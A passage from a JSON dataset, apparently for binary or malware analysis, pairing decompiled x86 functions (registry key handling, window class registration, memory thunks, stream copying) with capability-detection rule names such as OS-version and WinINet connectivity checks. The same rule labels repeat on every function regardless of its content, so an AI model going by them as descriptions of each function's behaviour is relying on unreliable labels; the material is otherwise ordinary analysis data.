        "decompiled_code": "\nvoid __cdecl\nfcn.00420d1c(int32_t arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack60 = 0x420d2d;\n    fcn.00407080();\n    uStack64 = 0x420f0f;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_4h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack76 = 0x420ee8;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if (arg_14h == 0) {\n        if (arg_10h < 0x100001) {\ncode_r0x00420d86:\n            var_ch = arg_10h;\n            goto code_r0x00420d8c;\n        }\n    }\n    else if (arg_14h < 1) goto code_r0x00420d86;\n    var_ch = 0x100000;\ncode_r0x00420d8c:\n    puStack84 = 0x420d94;\n    puStack60 = &stack0xfffffffc;\n    var_8h = fcn.00402f00();\n    uStack88 = 0x420ed7;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    do {\n        if (arg_14h == 0) {\n            if (arg_10h == 0) {\ncode_r0x00420e97:\n                *in_FS_OFFSET = uStack92;\n                puStack84 = 0x420ede;\n                uStack88 = 0x420eac;\n                fcn.00402f1c();\n                if (arg_1ch != NULL) {\n                    *arg_1ch = var_20h;\n                    arg_1ch[1] = var_1ch;\n                }\n                if (arg_18h != NULL) {\n                    *arg_18h = var_18h;\n                    arg_18h[1] = var_14h;\n                }\n                return;\n            }\n        }\n        else if (arg_14h < 1) goto code_r0x00420e97;\n        uVar1 = arg_10h;\n        if (arg_14h == 0) {\n            if (0x7fffffff < arg_10h) {\ncode_r0x00420dbd:\n                uVar1 = 0x7fffffff;\n            }\n        }\n        else if (0 < arg_14h) goto code_r0x00420dbd;\n        for (; 0 < uVar1; uVar1 = uVar1 - uVar2) {\n            var_10h = uVar1;\n            if (var_ch < uVar1) {\n                var_10h = var_ch;\n            }\n            uVar2 = (**(**(arg_8h + 0xc) + 0xc))();\n            if (uVar2 == 0) {\n                fcn.00404f70();\n                *in_FS_OFFSET = uStack92;\ncode_r0x00420ef9:\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x420f16;\n                uStack76 = 0x420f0e;\n                fcn.0040700c();\n                return;\n            }\n            bVar3 = CARRY4(var_18h, uVar2);\n            var_18h = var_18h + uVar2;\n            var_14h = var_14h + (uVar2 >> 0x1f) + bVar3;\n            var_28h = 0;\n            var_24h = 0;\n            var_4h = (**(*arg_ch + 0x10))(arg_ch, var_8h, uVar2, &fcn.00420d1c::var_28h);\n            bVar3 = CARRY4(var_20h, var_28h);\n            var_20h = var_20h + var_28h;\n            var_1ch = var_1ch + var_24h + bVar3;\n            if ((var_4h == 0) && (uVar2 != var_28h)) {\n                var_4h = -0x7fffbffb;\n            }\n            if (var_4h != 0) {\n                fcn.00404f70();\n                *in_FS_OFFSET = uStack92;\n                goto code_r0x00420ef9;\n            }\n            bVar3 = arg_10h < uVar2;\n            arg_10h = arg_10h - uVar2;\n            arg_14h = (arg_14h - (uVar2 >> 0x1f)) - bVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 1323
    },
    "00421084": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00421084(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x4999ec;\n    if (*0x4999f0 == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x4999ec;\n        fcn.004030fc();\n        uVar2 = fcn.0042107c();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.0042107c();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x4999f0;\n            puVar3 = puVar4 + 0xd;\n            *0x4999f0 = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x4999ec = puVar1;\n    puVar3 = *0x4999f0;\n    puVar1 = *0x4999f0 + 5;\n    *0x4999f0 = *(*0x4999f0 + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 379
    },
    "00421140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421140(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x491b60 = *0x4977f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4977f8, *0x491b74, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x491b74, *0x4977f8);\n        }\n        sub.user32.dll_RegisterClassA(0x491b50);\n    }\n    uVar2 = fcn.0040857c(0, *0x4977f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.00421084(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 297
    },
    "00421770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00421770(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) != 0) {\n        if (*(in_EAX + 0xc) == '\\0') {\n            sub.advapi32.dll_RegFlushKey(*(in_EAX + 4));\n        }\n        sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 4));\n        *(in_EAX + 4) = 0;\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "004217a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004217a0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 8)) {\n        if (*(in_EAX + 0x14) != '\\0') {\n            sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 8));\n            *(in_EAX + 0x14) = 0;\n        }\n        *(in_EAX + 8) = param_2;\n        fcn.00421770();\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "004218e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004218e4(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x4219e9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.004055c8();\n    uVar1 = fcn.00421658();\n    if (uVar1 == 0) {\n        fcn.00405a84();\n    }\n    var_ch = 0;\n    if ((var_5h == '\\0') || (var_4h == 0)) {\n        uVar2 = fcn.004059dc(0, *(in_EAX + 0x18), &var_ch);\n        uVar2 = fcn.004217f0(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    }\n    else {\n        uVar2 = fcn.004059dc(0, 0, 0, *(in_EAX + 0x18), 0, &var_ch, &var_10h);\n        uStack76 = fcn.004217f0(uVar2);\n        iVar3 = sub.advapi32.dll_RegCreateKeyExA();\n    }\n    var_6h = iVar3 == 0;\n    if (var_6h) {\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.004058e0(var_4h, 0x421a04, *(in_EAX + 0x10));\n        }\n        fcn.004217cc();\n    }\n    *in_FS_OFFSET = uStack76;\n    fcn.00405530(0x4219f0);\n    return;\n}\n",
        "token_count": 496
    },
    "00421a08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00421a08(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff90;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x421bb9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.004055c8();\n    uVar1 = fcn.00421658();\n    if (uVar1 == 0) {\n        fcn.00405a84();\n    }\n    var_ch = 0;\n    uVar4 = *(in_EAX + 0x18) & 0x300;\n    uVar2 = fcn.004059dc(0, uVar4 | 0x20019, &var_ch);\n    uVar2 = fcn.004217f0(uVar2);\n    iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    var_5h = iVar3 == 0;\n    if (var_5h) {\n        *(in_EAX + 0x18) = uVar4 | 0x20019;\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.004058e0(var_4h, 0x421bd4, *(in_EAX + 0x10));\n        }\n        fcn.004217cc();\n    }\n    else {\n        uVar2 = fcn.004059dc(0, uVar4 | 0x20009, &var_ch);\n        uVar2 = fcn.004217f0(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n        var_5h = iVar3 == 0;\n        if (var_5h) {\n            *(in_EAX + 0x18) = uVar4 | 0x20009;\n            if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                fcn.004058e0(var_4h, 0x421bd4, *(in_EAX + 0x10));\n            }\n            fcn.004217cc();\n        }\n        else {\n            uVar2 = fcn.004059dc(0, uVar4 | 1, &var_ch);\n            uVar2 = fcn.004217f0(uVar2);\n            iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n            var_5h = iVar3 == 0;\n            if (var_5h) {\n                *(in_EAX + 0x18) = uVar4 | 1;\n                if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                    in_stack_ffffff90 = var_4h;\n                    fcn.004058e0(var_4h, 0x421bd4, *(in_EAX + 0x10));\n                }\n                fcn.004217cc();\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff90;\n    fcn.00405530(0x421bc0);\n    return;\n}\n",
        "token_count": 792
    },
    "00421bd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00421bd8(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint hKey;\n    uint var_18h;\n    int32_t var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack76 = 0x421d42;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x421c07;\n    fcn.004055c8();\n    puStack84 = 0x421c0f;\n    var_11h._0_1_ = fcn.00421658();\n    if (var_11h == '\\0') {\n        puStack84 = 0x421c2a;\n        fcn.00405a84();\n    }\n    puStack84 = 0x421c3d;\n    iVar2 = fcn.00422274();\n    if (iVar2 != 0) {\n        iStack88 = 0x421cf8;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        puStack84 = &stack0xfffffffc;\n        fcn.00421804();\n        cVar1 = fcn.00421d70();\n        if (cVar1 != '\\0') {\n            fcn.00405620();\n            iVar4 = var_38h + -1;\n            if (-1 < iVar4) {\n                do {\n                    *NULL = var_34h + 1;\n                    fcn.004059dc(&fcn.00421bd8::var_11h + 1, 0, 0, 0, 0);\n                    iStack92 = iVar2;\n                    iVar3 = sub.advapi32.dll_RegEnumKeyExA();\n                    if (iVar3 == 0) {\n                        fcn.004059dc();\n                        fcn.00405728();\n                        fcn.00421bd8();\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != -1);\n            }\n        }\n        *in_FS_OFFSET = iStack92;\n        puStack84 = 0x421cff;\n        iStack88 = 0x421cee;\n        fcn.00421804();\n        iStack92 = 0x421cf7;\n        iStack88 = iVar2;\n        sub.advapi32.dll_RegCloseKey_1();\n        return;\n    }\n    puStack84 = 0x421d07;\n    puStack84 = fcn.004059dc();\n    iStack88 = 0x421d14;\n    iStack88 = fcn.004217f0();\n    iStack92 = 0x421d1a;\n    sub.advapi32.dll_RegDeleteKeyA();\n    *in_FS_OFFSET = iStack88;\n    iStack80 = 0x421d49;\n    puStack84 = 0x421d34;\n    fcn.00405530();\n    puStack84 = 0x421d41;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 811
    },
    "00421d70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00421d70(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    fcn.00403af4();\n    uVar1 = sub.advapi32.dll_RegQueryInfoKeyA\n                      (*(in_EAX + 4), 0, 0, 0, param_2, param_2 + 4, 0, param_2 + 8, param_2 + 0xc, param_2 + 0x10, 0, \n                       param_2 + 0x14);\n    if ((*(*0x494d28 + 0xc) != '\\0') && (**0x494d14 == 2)) {\n        *(param_2 + 4) = *(param_2 + 4) + *(param_2 + 4);\n        *(param_2 + 0xc) = *(param_2 + 0xc) + *(param_2 + 0xc);\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 246
    },
    "00422124": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00422124(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    cVar1 = fcn.00421f68();\n    if (cVar1 == '\\0') {\n        var_ch = 0;\n    }\n    else if (((var_10h == '\\x04') || (var_10h == '\\0')) && (var_ch <= arg_8h)) {\n        fcn.004221f0(&var_5h, var_ch);\n    }\n    else {\n        fcn.0042162c();\n    }\n    return var_ch;\n}\n",
        "token_count": 172
    },
    "004225cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004225cc(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uchar *puStack156;\n    uint uStack152;\n    uint uStack148;\n    uchar *puStack144;\n    int32_t iStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t dwIndex;\n    int32_t var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_4h = 0;\n    uStack92 = 0x42280d;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    var_18h = *(*(arg_8h + -4) + 4);\n    puStack100 = 0x42260e;\n    hKey = in_EAX;\n    fcn.00421804();\n    uStack104 = 0x4227e3;\n    uStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    uStack112 = 0x42262a;\n    puStack100 = &stack0xfffffffc;\n    cVar1 = fcn.00421d70();\n    if (cVar1 != '\\0') {\n        uStack112 = 0x422640;\n        fcn.00405620();\n        if (-1 < var_44h + -1) {\n            var_28h = var_44h;\n            dwIndex = 0;\n            do {\n                var_10h = var_40h + 1;\n                uStack112 = 0;\n                uStack116 = 0;\n                uStack120 = 0;\n                uStack124 = 0;\n                puStack128 = &fcn.004225cc::var_10h;\n                uStack132 = 0x422672;\n                uStack132 = fcn.004059dc();\n                iStack136 = dwIndex;\n                uStack108 = hKey;\n                puStack144 = 0x422680;\n                iVar2 = sub.advapi32.dll_RegEnumKeyExA();\n                if (iVar2 == 0) {\n                    puStack144 = 0x422690;\n                    fcn.004059dc();\n                    puStack144 = 0x42269a;\n                    fcn.00405728();\n                    puStack144 = 0x4226a8;\n                    var_20h = fcn.00422274();\n                    if (var_20h != 0) {\n                        uStack148 = 0x4227b4;\n                        uStack152 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff68;\n                        var_1ch = *(*(arg_8h + -4) + 4);\n                        puStack156 = 0x4226dd;\n                        puStack144 = &stack0xfffffffc;\n                        fcn.00421804();\n                        uStack160 = 0x422796;\n                        uStack164 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff5c;\n                        puStack168 = 0x4226f3;\n                        puStack156 = &stack0xfffffffc;\n                        fcn.004059dc();\n                        puStack168 = 0x4226fd;\n                        fcn.00405728();\n                        puStack168 = 0x42270b;\n                        fcn.00421808();\n                        puStack168 = 0x422713;\n                        fcn.004059dc();\n                        puStack168 = 0x42271d;\n                        fcn.00405728();\n                        puStack168 = 0x42272b;\n                        var_24h = fcn.00422274();\n                        uStack172 = 0x422773;\n                        uStack176 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff50;\n                        puStack168 = &stack0xfffffffc;\n                        fcn.004224a4(arg_8h);\n                        fcn.004225cc(arg_8h);\n                        *in_FS_OFFSET = uStack176;\n                        puStack168 = 0x42277a;\n                        uStack172 = var_24h;\n                        uStack176 = 0x422772;\n                        sub.advapi32.dll_RegCloseKey_1();\n                        return;\n                    }\n                }\n                dwIndex = dwIndex + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack108;\n    puStack100 = 0x4227ea;\n    uStack104 = 0x4227e2;\n    fcn.00421804();\n    return;\n}\n",
        "token_count": 1252
    },
    "00422818": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422818(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    int32_t iStack44;\n    uchar *puStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x422831;\n    cVar1 = fcn.0042230c();\n    if (cVar1 != '\\0') {\n        puStack28 = 0x422843;\n        cVar1 = fcn.0042230c();\n        if (cVar1 == '\\0') {\n            puStack28 = 0x422855;\n            iVar2 = fcn.00422274();\n            if (iVar2 != 0) {\n                iStack32 = 0x4228fa;\n                uStack36 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffdc;\n                puStack40 = 0x42287a;\n                puStack28 = &stack0xfffffffc;\n                fcn.00421808();\n                puStack40 = 0x422884;\n                iVar3 = fcn.00422274();\n                if (iVar3 != 0) {\n                    iStack44 = 0x4228dc;\n                    uStack48 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffd0;\n                    puStack40 = &stack0xfffffffc;\n                    fcn.004224a4(&stack0xfffffffc);\n                    fcn.004225cc(&stack0xfffffffc);\n                    if (arg_8h != '\\0') {\n                        fcn.00421bd8();\n                    }\n                    *in_FS_OFFSET = uStack48;\n                    puStack40 = 0x4228e3;\n                    uStack48 = 0x4228db;\n                    iStack44 = iVar3;\n                    sub.advapi32.dll_RegCloseKey_1();\n                    return;\n                }\n                *in_FS_OFFSET = uStack36;\n                puStack28 = 0x422901;\n                uStack36 = 0x4228f9;\n                iStack32 = iVar2;\n                sub.advapi32.dll_RegCloseKey_1();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 528
    },
    "00423a34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423a34(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x423a4f;\n    iVar2 = fcn.004239a8();\n    puStack24 = 0x423a59;\n    fcn.00423a1c();\n    uStack28 = 0x423b08;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (var_8h = *(in_EAX + 4); var_8h != NULL; var_8h = *var_8h) {\n        if (iVar2 == *(var_8h + 3)) {\n            cVar1 = fcn.00409954();\n            if (cVar1 != '\\0') break;\n        }\n    }\n    if (var_8h == NULL) {\n        var_8h = fcn.00402f00();\n        *var_8h = *(in_EAX + 4);\n        var_8h[1] = 0;\n        var_8h[2] = *param_2;\n        *(var_8h + 3) = iVar2;\n        fcn.004030fc();\n        *(in_EAX + 4) = var_8h;\n    }\n    var_8h[1] = var_8h[1] + 1;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x423b0f;\n    uStack28 = 0x423b07;\n    fcn.00423a28();\n    return;\n}\n",
        "token_count": 431
    },
    "00423b18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423b18(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 == NULL) {\n        return;\n    }\n    uStack28 = 0x423b3d;\n    fcn.00423a1c();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    param_2[1] = param_2[1] + -1;\n    if (param_2[1] == 0) {\n        puVar1 = *(in_EAX + 4);\n        if (*(in_EAX + 4) == param_2) {\n            *(in_EAX + 4) = *param_2;\n        }\n        else {\n            do {\n                puVar2 = puVar1;\n                puVar1 = *puVar2;\n            } while (puVar1 != param_2);\n            *puVar2 = *param_2;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x423ba7;\n    uStack32 = 0x423b9f;\n    fcn.00423a28();\n    return;\n}\n",
        "token_count": 330
    },
    "00423cd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00423cd4(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x423ce6;\n    fcn.00423a1c();\n    uStack28 = 0x423d34;\n    iVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (puVar2 = *(in_EAX + 4); puVar2 != NULL; puVar2 = *puVar2) {\n        iStack32 = puVar2[2];\n        if ((iStack32 != 0) && (puVar2[5] < 0)) {\n            sub.gdi32.dll_DeleteObject();\n            puVar2[2] = 0;\n            iVar1 = iStack32;\n        }\n        iStack32 = iVar1;\n        iVar1 = iStack32;\n    }\n    *in_FS_OFFSET = iVar1;\n    puStack24 = 0x423d3b;\n    uStack28 = 0x423d33;\n    iStack32 = iVar1;\n    fcn.00423a28();\n    return;\n}\n",
        "token_count": 307
    },
    "00424260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00424260(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 10) != 0) {\n        (**(in_EAX + 8))();\n    }\n    return;\n}\n",
        "token_count": 52
    },
    "00424d00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
